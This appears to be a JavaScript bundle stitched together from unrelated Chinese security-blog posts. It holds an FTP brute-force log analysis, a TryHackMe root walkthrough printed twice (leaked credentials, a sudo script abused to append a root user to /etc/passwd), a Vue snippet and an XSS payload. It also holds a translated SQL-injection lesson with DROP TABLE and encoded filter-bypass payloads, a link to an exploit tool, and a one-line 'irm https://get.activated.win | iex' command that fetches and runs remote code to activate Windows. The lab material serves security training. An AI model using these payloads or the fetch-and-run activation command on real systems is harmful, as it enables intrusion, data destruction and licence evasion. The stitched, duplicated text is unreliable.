\`\`\`
6	0.006512	192.168.56.1	192.168.56.101	FTP	76	Request: USER bro 

# 发送用户名bro
8	0.009093	192.168.56.101	192.168.56.1	FTP	98	Response: 331 Password required for bro.
# 要求必须要输入密码
10	0.009567	192.168.56.1	192.168.56.101	FTP	74	Request: PASS 1
# 输入密码1
12	2.371080	192.168.56.101	192.168.56.1	FTP	88	Response: 530 Login incorrect.
# ftp服务端返回登录失败
14	2.371558	192.168.56.1	192.168.56.101	FTP	72	Request: QUIT
# 每次登录失败后，客户端都发送 \`QUIT\` 请求关闭连接
16	2.371849	192.168.56.101	192.168.56.1	FTP	80	Response: 221 Goodbye.
# 服务器会响应 \`221 Goodbye\`，表示断开连接
24	2.382200	192.168.56.101	192.168.56.1	FTP	135	Response: 220 redmint FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17) ready.
# 准备第二次ftp登录
26	2.382326	192.168.56.1	192.168.56.101	FTP	76	Request: USER bro
# 用户名依旧为bro
28	2.384485	192.168.56.101	192.168.56.1	FTP	98	Response: 331 Password required for bro.
30	2.384678	192.168.56.1	192.168.56.101	FTP	74	Request: PASS 2
# 输入密码为2
-----
596	57.457335	192.168.56.1	192.168.56.101	FTP	75	Request: PASS 30
598	59.116920	192.168.56.101	192.168.56.1	FTP	88	Response: 530 Login incorrect.
600	59.117344	192.168.56.1	192.168.56.101	FTP	72	Request: QUIT
602	59.117560	192.168.56.101	192.168.56.1	FTP	80	Response: 221 Goodbye.
# 直到登录30次密码登录失败后停止了登录

\`\`\`


## 结论
网络数据捕获可以分析出ip 192.168.56.1 对目标ip的ftp服务进行了长达30次的登录，有理由怀疑，ip 192.168.56.1 在利用枚举尝试进行未授权访问。`,I=`---
title: OA利用工具
password: lidefei
---


https://github.com/cseroad/Exp-Tools
\`java -javaagent:Exp-Tools-1.3.1-encrypted.jar -jar Exp-Tools-1.3.1-encrypted.jar\``,D=`---
title: U.A. High School·
description: 
tags:
  - THM
  - 靶场
---

\`\`\`
本机IP:10.17.5.121
目标ip:10.10.167.217
\`\`\`
## 信息搜集

![](assets/img/Pasted%20image%2020241116134031.png)

![](assets/img/Pasted%20image%2020241116140002.png)
403 bypass?

![](assets/img/Pasted%20image%2020241116135721.png)
![](assets/img/Pasted%20image%2020241116135051.png)

![](assets/img/Pasted%20image%2020241116135337.png)


## 分析流量包
![](assets/img/Pasted%20image%2020241116140328.png)

确实存在一个文件
	![](assets/img/Pasted%20image%2020241116140515.png)

进行模糊测试
![](assets/img/Pasted%20image%2020241116140749.png)

![](assets/img/Pasted%20image%2020241116141240.png)

## webshell

立足点 getwebshell

![](assets/img/Pasted%20image%2020241116141440.png)

反弹shell

![](assets/img/Pasted%20image%2020241116141917.png)

![](assets/img/Pasted%20image%2020241116141930.png)

转化为tty


![](assets/img/Pasted%20image%2020241116142301.png)
![](assets/img/Pasted%20image%2020241116142800.png)

![](assets/img/Pasted%20image%2020241116143154.png)

\`\`\`
kali@kali ~/Documents/thm/U-A-High-School 
❯ hexeditor -b oneforall.jpg                                                                                                    
kali@kali ~/Documents/thm/U-A-High-School 
❯ thunar                                                                                                                        
kali@kali ~/Documents/thm/U-A-High-School 
❯ steghide extract -sf oneforall.jpg                                                                                            
Enter passphrase:                                                                                                               
the file "creds.txt" does already exist. overwrite ? (y/n) n
steghide: did not write to file "creds.txt".
kali@kali ~/Documents/thm/U-A-High-School [1]

\`\`\`

\`\`\`
❯ cat creds.txt                                                                                                                 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:      

deku:One?For?All_!!one1/A
\`\`\`

## usershell

\`\`\`
❯ ssh deku@10.10.167.217                                                                                                        
The authenticity of host '10.10.167.217 (10.10.167.217)' can't be established.                                                  
ED25519 key fingerprint is SHA256:OgRmqdwC/bY0nCsZ5+MHrpGGo75F1+78/LGZjSVg2VY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.167.217' (ED25519) to the list of known hosts.
deku@10.10.167.217's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 16 Nov 2024 06:35:11 AM UTC

  System load:  0.0               Processes:             119
  Usage of /:   47.0% of 9.75GB   Users logged in:       0
  Memory usage: 48%               IPv4 address for eth0: 10.10.167.217
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

37 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 22 21:27:54 2024 from 10.0.0.3
deku@myheroacademia:~$ 

\`\`\`

# rootshell

\`\`\`
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh

\`\`\`

可以写入任意命令

\`\`\`
deku@myheroacademia:~$ sudo /opt//NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
test>/tmp/tet.txt
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ cat /tmp/tet.txt 

\`\`\`

手动制作一个密码
\`\`\`
mkpasswd -m md5crypt -s
密码：admin
$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1

\`\`\`

\`\`\`
test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash
\`\`\`
\`\`\`
deku@myheroacademia:~$ sudo /opt//NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
'test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash' >> /etc/passwd
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ cat /etc/passwd

\`\`\`

\`\`\`
deku@myheroacademia:~$ tail -n1 /etc/passwd
test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash

\`\`\`

\`\`\`
deku@myheroacademia:~$ su test
Password: 
root@myheroacademia:/home/deku# id
uid=0(root) gid=0(root) groups=0(root)

\`\`\`

\`\`\`
root@myheroacademia:~# cat root.txt
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\\ \\ / /__  _   _     / \\   _ __ ___  | \\ | | _____      __ |_   _| |__   ___ 
 \\ V / _ \\| | | |   / _ \\ | '__/ _ \\ |  \\| |/ _ \\ \\ /\\ / /   | | | '_ \\ / _ \\
  | | (_) | |_| |  / ___ \\| | |  __/ | |\\  | (_) \\ V  V /    | | | | | |  __/
  |_|\\___/ \\__,_| /_/   \\_\\_|  \\___| |_| \\_|\\___/ \\_/\\_/     |_| |_| |_|\\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \\ | | ___  /   |   | |__| | ___ _ __  ___
            |  \\| |/ _ \\/_/| |   |  __  |/ _ \\ '__|/ _ \\
            | |\\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \\_|\\___/|______| |_|  |_|\\___|_|   \\___/ 


\`\`\``,M=`---
title: U.A. High School·
description: 
tags:
  - THM
  - 靶场
---

\`\`\`
本机IP:10.17.5.121
目标ip:10.10.167.217
\`\`\`
## 信息搜集

![](assets/img/Pasted%20image%2020241116134031.png)

![](assets/img/Pasted%20image%2020241116140002.png)
403 bypass?

![](assets/img/Pasted%20image%2020241116135721.png)
![](assets/img/Pasted%20image%2020241116135051.png)

![](assets/img/Pasted%20image%2020241116135337.png)


## 分析流量包
![](assets/img/Pasted%20image%2020241116140328.png)

确实存在一个文件
	![](assets/img/Pasted%20image%2020241116140515.png)

进行模糊测试
![](assets/img/Pasted%20image%2020241116140749.png)

![](assets/img/Pasted%20image%2020241116141240.png)

## webshell

立足点 getwebshell

![](assets/img/Pasted%20image%2020241116141440.png)

反弹shell

![](assets/img/Pasted%20image%2020241116141917.png)

![](assets/img/Pasted%20image%2020241116141930.png)

转化为tty


![](assets/img/Pasted%20image%2020241116142301.png)
![](assets/img/Pasted%20image%2020241116142800.png)

![](assets/img/Pasted%20image%2020241116143154.png)

\`\`\`
kali@kali ~/Documents/thm/U-A-High-School 
❯ hexeditor -b oneforall.jpg                                                                                                    
kali@kali ~/Documents/thm/U-A-High-School 
❯ thunar                                                                                                                        
kali@kali ~/Documents/thm/U-A-High-School 
❯ steghide extract -sf oneforall.jpg                                                                                            
Enter passphrase:                                                                                                               
the file "creds.txt" does already exist. overwrite ? (y/n) n
steghide: did not write to file "creds.txt".
kali@kali ~/Documents/thm/U-A-High-School [1]

\`\`\`

\`\`\`
❯ cat creds.txt                                                                                                                 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:      

deku:One?For?All_!!one1/A
\`\`\`

## usershell

\`\`\`
❯ ssh deku@10.10.167.217                                                                                                        
The authenticity of host '10.10.167.217 (10.10.167.217)' can't be established.                                                  
ED25519 key fingerprint is SHA256:OgRmqdwC/bY0nCsZ5+MHrpGGo75F1+78/LGZjSVg2VY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.167.217' (ED25519) to the list of known hosts.
deku@10.10.167.217's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 16 Nov 2024 06:35:11 AM UTC

  System load:  0.0               Processes:             119
  Usage of /:   47.0% of 9.75GB   Users logged in:       0
  Memory usage: 48%               IPv4 address for eth0: 10.10.167.217
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

37 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 22 21:27:54 2024 from 10.0.0.3
deku@myheroacademia:~$ 

\`\`\`

# rootshell

\`\`\`
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh

\`\`\`

可以写入任意命令

\`\`\`
deku@myheroacademia:~$ sudo /opt//NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
test>/tmp/tet.txt
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ cat /tmp/tet.txt 

\`\`\`

手动制作一个密码
\`\`\`
mkpasswd -m md5crypt -s
密码：admin
$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1

\`\`\`

\`\`\`
test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash
\`\`\`
\`\`\`
deku@myheroacademia:~$ sudo /opt//NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
'test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash' >> /etc/passwd
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ cat /etc/passwd

\`\`\`

\`\`\`
deku@myheroacademia:~$ tail -n1 /etc/passwd
test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash

\`\`\`

\`\`\`
deku@myheroacademia:~$ su test
Password: 
root@myheroacademia:/home/deku# id
uid=0(root) gid=0(root) groups=0(root)

\`\`\`

\`\`\`
root@myheroacademia:~# cat root.txt
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\\ \\ / /__  _   _     / \\   _ __ ___  | \\ | | _____      __ |_   _| |__   ___ 
 \\ V / _ \\| | | |   / _ \\ | '__/ _ \\ |  \\| |/ _ \\ \\ /\\ / /   | | | '_ \\ / _ \\
  | | (_) | |_| |  / ___ \\| | |  __/ | |\\  | (_) \\ V  V /    | | | | | |  __/
  |_|\\___/ \\__,_| /_/   \\_\\_|  \\___| |_| \\_|\\___/ \\_/\\_/     |_| |_| |_|\\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \\ | | ___  /   |   | |__| | ___ _ __  ___
            |  \\| |/ _ \\/_/| |   |  __  |/ _ \\ '__|/ _ \\
            | |\\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \\_|\\___/|______| |_|  |_|\\___|_|   \\___/ 


\`\`\``,N=`---
title: Vue使用指南 # 文章名称
tags: [Code,Vue]
categories: [Vue]
---

Vue.js 是一个流行的 JavaScript 框架，用于构建现代的交互式 Web 应用程序。它提供了一种简单而灵活的方式来创建用户界面，使开发者能够轻松地构建复杂的单页面应用（SPA）和动态网页。Vue.js 的核心库只关注视图层，因此它易于集成到现有项目中，并且可以与其他库和框架（如 React 和 Angular）一起使用。

# 开始

\`npm run dev\` 启动开发服务器

## 基本文件

- \`App.vue\`：Vue 应用程序的入口文件，包含根组件的挂载点。

文件如下
\`\`\`vue
<template>
  <h2>{{ count }}</h2>
  <br>
  <TodoItem/>
</template>

<script>
  import TodoItem from './components/TodoItem.vue'
  export default{
    name: "App",
    components:{TodoItem}
  }

<\/script>
<style scoped>

</style>
\`\`\`
`,R=`---
title: windows激活工具|命令行
tags:
  - Windows
  - 安全工具
---

输入Win+R 带来cmd 输入下行代码可以进行激活

\`\`\`
irm https://get.activated.win | iex
\`\`\``,F=`## 反射性xss

搜索后会进行回显 尝试输入
\`\`\`js
	<script>alert(1)<\/script>
\`\`\`

## 存储性xss

留言处xss
`,O=`---
title: 高级 SQL 注入
tags:
  - 靶场
description:
---
> 

# 简介

SQL 注入仍然是 Web 应用程序最严重和最广泛的安全漏洞之一。当攻击者利用 Web 应用程序执行任意 SQL 查询的能力，导致未经授权访问数据库、数据泄露、数据操纵，甚至完全控制应用程序时，就会出现这种威胁。在这个房间里，我们将了解高级 SQL 注入技术，全面了解复杂的攻击向量和缓解策略。  

在这个房间结束时，您将对各种 SQL 注入技术有更深入的了解。这将使您具备在多种情况下识别和利用这些漏洞的技能，并实施强大的防御措施来保护您的应用程序。  

学习目标

在整个课程中，您将全面了解以下关键概念：

- 二阶 SQL 注入  
    
- 过滤器规避
- 带外 SQL 注入
- 自动化技术
- 缓解措施


我们介绍了基本技术，例如基于错误和基于联合的 SQL 注入，以及盲目 SQL 注入方法，例如基于布尔值和基于时间的攻击。以下是对 SQL 注入核心基本类型的房间的快速回顾
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207162649.png)

## 带内 SQL 注入

这种技术被认为是最常见和最直接的 SQL 注入攻击类型。在这种技术中，攻击者使用相同的通信通道进行数据的注入和检索。带内 SQL 注入有两种主要类型：  

- **基于错误的 SQL 注入**：攻击者操纵 SQL 查询以从数据库生成错误消息。这些错误消息通常包含有关数据库结构的信息，可用于进一步利用数据库。示例： .如果在错误消息中返回数据库版本，则会显示有关数据库的信息。\`SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))\`
- **基于 Union 的 SQL 注入**：攻击者使用 UNION SQL 运算符将两个或多个 SELECT 语句的结果合并为一个结果，从而从其他表中检索数据。示例： .\`SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin\`

## 推理（盲目）SQL 注入  

推理 SQL 注入不会直接通过 Web 应用程序传输数据，这使得利用它更具挑战性。相反，攻击者会发送有效负载并观察应用程序的行为和响应时间，以推断有关数据库的信息。推理 SQL 注入有两种主要类型：  

- **基于布尔值的盲目 SQL 注入**：攻击者向数据库发送 SQL 查询，迫使应用程序根据 true 或 false 条件返回不同的结果。通过分析应用程序的响应，攻击者可以推断有效负载是 true 还是 false。示例： . 如果页面内容或行为根据条件发生变化，攻击者可以推断结果。\`SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)\`
- **基于时间的盲目 SQL 注入**：攻击者向数据库发送 SQL 查询，如果条件为 true，则延迟响应指定时间。通过测量响应时间，攻击者可以推断条件是 true 还是 false。例如，.如果响应延迟 5 秒，攻击者可以推断出条件为 true。\`SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--\`

  
## 带外 SQL 注入

当攻击者无法使用相同的通道发起攻击并收集结果，或者服务器响应不稳定时，会使用带外 SQL 注入。该技术依赖于数据库服务器发出带外请求（例如 HTTP 或 DNS）以将查询结果发送给攻击者。HTTP 通常用于带外 SQL 注入，以将查询结果发送到攻击者的服务器。 我们将在这个房间里详细讨论它。

每种类型的 SQL 注入技术都有其优点和挑战。了解这些技术对于识别和缓解 Web 应用程序中的 SQL 注入漏洞至关重要。带内 SQL 注入易于利用和检测，但噪音很大，很容易被监控。推理（盲）SQL 注入更难利用，需要多个请求，但可以在详细错误消息不可用时使用。带外 SQL 注入不太常见且非常有效，需要外部服务器控制，并且依赖于数据库发出带外请求的能力。通过掌握这些技术，渗透测试人员可以有效地识别和利用 SQL 注入漏洞，帮助组织保护其 Web 应用程序免受这些关键威胁。


# 二阶 SQL 注入

二阶 SQL 注入（也称为存储 SQL 注入）利用了以下漏洞：用户提供的输入被保存并随后在应用程序的不同部分使用，可能在一些初始处理之后。这种类型的攻击更加隐蔽，因为恶意 SQL 代码不需要立即导致 SQL 语法错误或其他明显问题，这使得它更难使用标准输入验证技术进行检测。当数据被检索并在 SQL 命令中使用时，第二次使用数据时，会发生注入，因此名称为 “**Second Order**”。
⚠️upload failed, check dev console
冲击

Second-Order SQL Injection 的危险在于它能够绕过典型的前端防御，例如基本输入验证或清理，这些防御仅发生在初始数据输入时。由于有效载荷在第一步不会造成中断，因此可以忽略它，直到为时已晚，从而使攻击特别隐蔽。  

**示例**  
：我们将使用书评应用程序。该应用程序允许用户通过网页 （） 添加新书籍。系统会提示用户提供有关他们希望添加到数据库的书籍的详细信息。您可以通过 [访问该应用程序。](http://10.10.164.79/case1.)收集的数据包括 、 和 。让我们考虑添加一本具有以下详细信息的书：**SSN：UI00012**，**书名：Intro to PHP**，**作者：Tim**。此信息通过页面上的表单输入，提交后，将存储在 **BookStore** 数据库中，如下所示：\`add.php\`\`http://10.10.164.79/second/add.php\`\`SSN\`\`book_name\`\`author\`\`add.php\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163127.png)
正如我们所知，二阶 SQL 注入的识别非常具有挑战性。与利用实时处理漏洞的传统 SQL 注入不同，当以前存储在数据库中的数据稍后用于 SQL 查询时，就会发生这种情况。检测此漏洞通常需要了解数据如何流经应用程序并重复使用，因此需要深入了解后端操作。  

**代码分析**

\`\`\`php
if (isset($_POST['submit'])) {

    $ssn = $conn->real_escape_string($_POST['ssn']);

    $book_name = $conn->real_escape_string($_POST['book_name']);

    $author = $conn->real_escape_string($_POST['author']);

    $sql = "INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')";

    if ($conn->query($sql) === TRUE) {

        echo "<p class='text-green-500'>New book added successfully</p>";

    } else {

        echo "<p class='text-red-500'>Error: " . $conn->error . "</p>";

    }

}
\`\`\`

该代码使用该方法对输入中的特殊字符进行转义。虽然此方法可以通过转义单引号和其他 SQL 元字符来降低立即 SQL 注入的一些风险，但它并不能保护应用程序免受二阶 SQLi 的攻击。这里的关键问题是缺少参数化查询，这对于防止 SQL 注入攻击至关重要。使用该方法插入数据时，它可能包含不会立即造成伤害但可以在后续检索时激活并在另一个 SQL 查询中使用的有效负载字符。例如，插入名称为 like 的书籍可能不会影响 **INSERT** 操作，但如果稍后在另一个 SQL 上下文中使用书籍名称而没有正确处理，则可能会产生严重影响。\`real_escape_string()\`\`real_escape_string()\`\`Intro to PHP'; DROP TABLE books;--\`

让我们尝试添加另一本 SSN 为 的书籍。\`test'\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207171142.png)

好了，SSN 已成功插入到数据库中。该应用程序包括通过类似 的界面更新书籍详细信息的功能。此界面可能会在可编辑的表单字段中显示现有书籍详细信息，根据以前存储的数据进行检索，然后根据用户输入对其进行更新。渗透测试人员将调查应用程序是否重用了以前存储且可能受污染的数据（例如 ）。然后，他将构建 SQL 查询，以使用这些可能受污染的数据更新记录，而无需进行适当的清理或参数化。通过操纵更新功能，测试人员可以查看在插入阶段添加的恶意负载是否在更新操作期间被执行。如果应用程序在此阶段未能采用适当的安全措施，则可能会激活早期注入的有效负载，从而导致执行有害的 SQL 命令，例如删除表。您可以访问该页面以更新任何图书详情。\`test'\`\`update.php\`\`book_name\`\`'; DROP TABLE books; --\`\`http://10.10.164.79/second/update.php\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163213.png)
现在，让我们回顾一下代码。PHP 脚本允许用户更新 **BookStore** 数据库中的书籍详细信息。通过查询结构，我们将分析渗透测试人员可能寻找 SQL 注入漏洞的典型场景，特别关注在 SQL 查询中如何处理和利用用户输入。\`update.php\`


\`\`\`php
if ( isset($_POST['update'])) {
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];

    $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
..
...
\`\`\`

该脚本首先检查请求方法是否为 POST，以及是否按下了更新按钮，这表示用户打算更新书籍的详细信息。在此之后，该脚本直接从 POST 数据中检索用户输入：

\`\`\`php
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];
\`\`\`

然后，这些变量 （） 用于构造 SQL 查询，以更新数据库中指定书籍的详细信息：\`ssn, new_book_name, new_author\`

\`\`\`php
$update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
\`\`\`

该脚本用于执行多个查询。它还将日志插入日志表中以进行分析。\`multi_query\`  

准备 Payload

我们知道，我们可以根据他们的 .更新书籍的常规查询可能如下所示：\`ssn\`

\`\`\`php
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
\`\`\`

但是，如果攻击者插入特别构建的值，则 SQL 命令可能纵。例如，如果攻击者使用值：\`ssn\`\`ssn\`

\`\`\`php
12345'; UPDATE books SET book_name = 'Hacked'; --
\`\`\`

在 update 查询中使用此值时，它会有效地结束初始 update 命令并启动新命令。这会将 books 表中所有条目的 更改为 **Hacked**。\`12345\`\`book_name\`  

**让我们这样做**

- **Initial Payload Insertion**：添加一本新书籍，并将有效负载作为 .分号 （） 将用于终止当前 SQL 语句。\`12345'; UPDATE books SET book_name = 'Hacked'; --\`\`ssn\`\`;\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163303.png)


- **恶意 SQL 执行**：之后，当管理员或任何其他用户访问 URL 并更新书籍时，插入的有效负载会跳出预期的 SQL 命令结构并注入一个新命令，该命令会更新 books 表中的所有记录。让我们访问页面 ，将书名更新为任何内容，然后单击 **更新** 按钮。该代码将在后端执行以下语句。\`http://10.10.164.79/second/update.php\`\`http://10.10.164.79/second/update.php page\`

\`\`\`php
UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name ="hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');
\`\`\`

- **注释掉其余部分**：双破折号 （） 是一个 SQL 注释符号。SQL Server 将忽略以下任何内容，从而有效地消除原始 SQL 语句中可能导致错误或揭示攻击的任何剩余部分。执行上述查询后，它会将所有书籍的名称更改为 **hacked**，如下所示：\`--\`\`--\`
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163314.png)

在本任务中，我们通过易受攻击的书评 Web 应用程序探索了二阶 SQL 注入概念。作为渗透测试人员，检查用户输入如何存储以及随后在 SQL 查询中使用至关重要。这包括验证所有形式的数据处理是否针对此类漏洞都是安全的，强调全面测试和安全实践知识的重要性，以防止注入威胁。
# Filter Evasion 技术

在高级 SQL 注入攻击中，规避过滤器对于成功利用漏洞至关重要。现代 Web 应用程序通常会实施防御措施来清理或阻止常见的攻击模式，这使得简单的 SQL 注入尝试无效。作为渗透测试人员，我们必须使用更复杂的技术来绕过这些过滤器。本节将介绍此类方法，包括**字符编码**、**无引号** SQL 注入以及处理不能使用**空格**的场景。通过理解和应用这些技术，我们可以通过严格的输入验证和安全控制有效地渗透 Web 应用程序。

字符编码  
字符编码涉及将 SQL 注入负载中的特殊字符转换为可能绕过输入过滤器的编码形式。  

- **URL 编码**：URL 编码是一种常用方法，其中字符使用百分号 （%） 表示，后跟十六进制的 ASCII 值。例如，payload 可以编码为 .这种编码可以帮助输入通过 Web 应用程序过滤器并被数据库解码，而数据库在初始处理期间可能无法将其识别为恶意输入。\`' OR 1=1--\`\`%27%20OR%201%3D1--\`
- **十六进制编码**：十六进制编码是使用十六进制值构建 SQL 查询的另一种有效技术。例如，查询可以编码为 .通过将字符表示为十六进制数字，攻击者可以绕过在处理输入之前不解码这些值的过滤器。\`SELECT * FROM users WHERE name = 'admin'\`\`SELECT * FROM users WHERE name = 0x61646d696e\`
- \`Unicode Encoding\`：Unicode 编码使用 Unicode 转义序列表示字符。例如，字符串可以编码为 .此方法可以绕过仅检查特定 ASCII 字符的过滤器，因为数据库将正确处理编码的输入。\`admin\`\`\\u0061\\u0064\\u006d\\u0069\\u006e\`

**例**

在此示例中，我们将探讨开发人员如何通过从用户输入中删除特定关键字和字符来实施基本筛选来防止 SQL 注入攻击。但是，我们还将看到攻击者如何使用 URL 编码等字符编码技术绕过这些防御。

**注意**：在接下来的练习中，我们将使用与上一个不同的数据库。您可以在 访问该页面。\`http://10.10.164.79/encoding/\`

以下是处理搜索功能的 PHP 代码 （search_books.php）：

\`\`\`php
$book_name = $_GET['book_name'] ?? '';
$special_chars = array("OR", "or", "AND", "and" , "UNION", "SELECT");
$book_name = str_replace($special_chars, '', $book_name);
$sql = "SELECT * FROM books WHERE book_name = '$book_name'";
echo "<p>Generated SQL Query: $sql</p>";
$result = $conn->query($sql) or die("Error: " . $conn->error . " (Error Code: " . $conn->errno . ")");
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
...
..
\`\`\`

以下是 index.html 页中的 Javascript 代码，它提供了用于搜索书籍的用户界面：

\`\`\`php
function searchBooks() {
const bookName = document.getElementById('book_name').value;
const xhr = new XMLHttpRequest();
xhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);
   xhr.onload = function() {
       if (this.status === 200) {
           document.getElementById('results').innerHTML = this.responseText;
\`\`\`

在上面的示例中，开发人员实施了一种基本的防御机制，通过删除特定的 SQL 关键字（如 、、 和 ）来防止 SQL 注入攻击。筛选使用函数，该函数在将这些关键字包含在 SQL 查询中之前从用户输入中去除这些关键字。这种过滤方法旨在使攻击者更难注入恶意 SQL 命令，因为这些关键字对于许多 SQL 注入负载至关重要。\`OR\`\`AND\`\`UNION\`\`SELECT\`\`str_replace\`

准备 Payload

让我们逐步完成准备 SQL 注入有效负载的过程，展示 URL 编码如何绕过基本防御。首先，让我们看看包含特殊字符或 SQL 关键字的普通输入会发生什么情况。当我们搜索一本名为 的书时，我们得到成功的结果如下：\`Intro to PHP\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165257.png)


但是，如果我们尝试通过添加特殊字符（如 、 等）来中断查询呢？我们将得到以下输出：\`'\`\`;\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165327.png)
SQL 查询未正确执行，这可能意味着存在 SQL 注入的可能性。让我们尝试注入有效负载 “”。我们将得到以下输出：\`Intro to PHP' OR 1=1\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165337.png)
那么，这里发生了什么？当此输入传递给 PHP 脚本时，该函数将去除 OR 关键字和单引号，从而产生经过清理的输入，该输入不会执行预期的 SQL 注入。此输入无效，因为筛选会删除 SQL 注入成功所需的关键组件。\`str_replace\`

要绕过过滤，我们需要使用 URL 编码对输入进行编码，URL 编码以过滤器无法识别和删除的方式表示特殊字符和关键字。以下是示例 payload 。\`1%27%20||%201=1%20--+\`

- \`%27\`是单引号 （'） 的 URL 编码。
- \`%20\`是空格 （ ） 的 URL 编码。
- \`||\`表示 SQL OR 运算符。
- \`%3D\`是等号 （=） 的 URL 编码。
- \`%2D%2D\`是在 SQL 中启动注释的 --, 的 URL 编码。

